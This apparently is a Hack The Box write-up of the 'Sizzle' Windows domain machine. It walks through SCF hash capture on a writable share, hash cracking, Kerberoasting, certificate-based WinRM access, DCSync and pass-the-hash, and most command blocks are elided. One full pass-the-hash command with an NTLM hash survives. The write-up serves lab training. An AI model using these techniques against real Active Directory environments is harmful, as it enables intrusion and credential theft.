...
tags: [hackthebox, sizzle, nmap parsing output, ftp enum, smbcacls, scf attack, hashcat, ldap enum, ADCS-CSR, Shell Escape, CLM Bypass, Kerberoasting, WinRM, Bloodhound, DCSync, Passthehash ]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
...
```
In addition, we can export the XML due to the number of ports[^nmap-parser] and for better visualization.
...
```
To enumerate the "Department Shares" we can mount[^mount-share] it to our local machine: 
```bash
...
```
Now let's try to enumerate permissions on all the user's folder to see if we get any of them: [^share-permissions]
```bash
...
ACL:Everyone:ALLOWED/OI|CI|I/READ
```
We notice that Public Folder has FULL permissions, meaning we can write on it so let's try an [SMB Share with writting Permissions (SCF Attack)](https://shuciran.github.io/posts/SMB-Share-with-writting-Permissions-(SCF-Attack)/)[^scf-attack] first of all let's create a file called test.scf with the following content:
```bash
cat test.scf  
[Shell]
Command=2
...
```
Once we get the hash we can use [Hashcat](https://shuciran.github.io/posts/Hashcat/) and crack it:
```bash
...
```
We can't access to the machine, so let's try with another approach, since we already have this credentials, we can request a TGS to the domain with the impacket GetSPNs script and perform a Kerberoasting attack [^kerberoasting]:
```bash
...
```
Now that we have credentials we can enumerate the port RPC[^rpc-enum]:
```bash
...
```
We also can dump useful information from the domain controller via ldapdomaindump[^ldapdomaindump] tool:
```bash
...
After some research we identify that this /certsrv endpoint means that we can authenticate via WINRM by creating a certificate this is an AD CS feature. As we can check on this [WIN-RM Auth via certificates](https://notes.offsec-journey.com/enumeration/winrm) all we need to do is follow this steps[^winrm-auth-cert]: 
...
```
Since we already know because of the output of Bloodhound that this user is vulnerable to DCSync[^dcsync], we can use the impacket-secretsdump utility to extract the hashes on the machine: 
```bash
...
...
```
Then all we need to do is a [Pass The Hash](https://shuciran.github.io/posts/Pass-The-Hash/)[^pass-the-hash] exploitation to connect as administrator to the machine with impacket-wmiexec[^pth-impacket-wmiexec]:
```bash
impacket-wmiexec htb.local/Administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267
```
Or use the psexec utility[^pth-impacket-psexec]:
```bash
...
[^mount-share]: Mounting SMB share with mount command
[^share-permissions]: Enumerate permissions on shares
[^bloodhound-python]: Bloodhound execution
[^scf-attack]: SMB Share with writting Permissions
[^nmap-parser]: Nmap Parser Output
[^kerberoasting]: Kerberoasting Attack
[^rpc-enum]: RPC Enumeration
[^ldapdomaindump]: Dumping useful information from the domain controller via LDAP
[^winrm-auth-cert]: WinRM Certificate (password-less) based authentication
[^evil-winrm]: Connection through WINRM via evil-winrm
[^dcsync]: DCSync Attack
[^pass-the-hash]: Pass The Hash Attack
[^pth-impacket-psexec]: Pass The Hash Attack with impacket-psexec
[^pth-impacket-wmiexec]: Pass The Hash Attack with impacket-wmiexec